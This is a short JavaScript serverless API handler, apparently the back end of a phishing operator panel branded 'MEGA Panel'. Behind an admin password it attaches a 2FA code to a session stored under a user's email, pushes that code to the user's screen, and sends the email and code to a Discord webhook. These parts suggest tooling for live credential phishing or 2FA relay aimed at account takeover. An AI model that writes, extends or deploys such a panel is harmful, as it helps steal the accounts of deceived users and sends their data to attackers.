import { Redis } from '@upstash/redis';

const redis = Redis.fromEnv();

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { sessionId, code, adminPassword } = req.body;

        if (!sessionId || !code) {
            return res.status(400).json({ error: 'Brak sessionId lub kodu' });
        }

        if (adminPassword !== process.env.ADMIN_PASSWORD) {
            return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
        }

        const data = await redis.get(`session:${sessionId}`);
        if (!data) {
            return res.status(404).json({ error: 'Sesja nie istnieje' });
        }

        const session = JSON.parse(data);
        session.code = code;
        session.codeSetAt = new Date().toISOString();

        await redis.setex(`session:${sessionId}`, 300, JSON.stringify(session));

        const webhook = process.env.DISCORD_WEBHOOK;
        if (webhook) {
            await fetch(webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: 'MEGA Panel',
                    embeds: [{
                        title: '🔐 Kod 2FA ustawiony',
                        description: `Kod: ${code} dla użytkownika ${session.email}`,
                        color: 0x4ADE80,
                        fields: [
                            { name: '📧 Email', value: session.email, inline: true },
                            { name: '🔐 Kod', value: code, inline: true }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                })
            });
        }

        return res.status(200).json({ 
            success: true, 
            message: 'Kod ustawiony! Użytkownik widzi go na ekranie.'
        });

    } catch (error) {
        console.error('Set code error:', error);
        return res.status(500).json({ error: 'Internal server error' });
    }
}
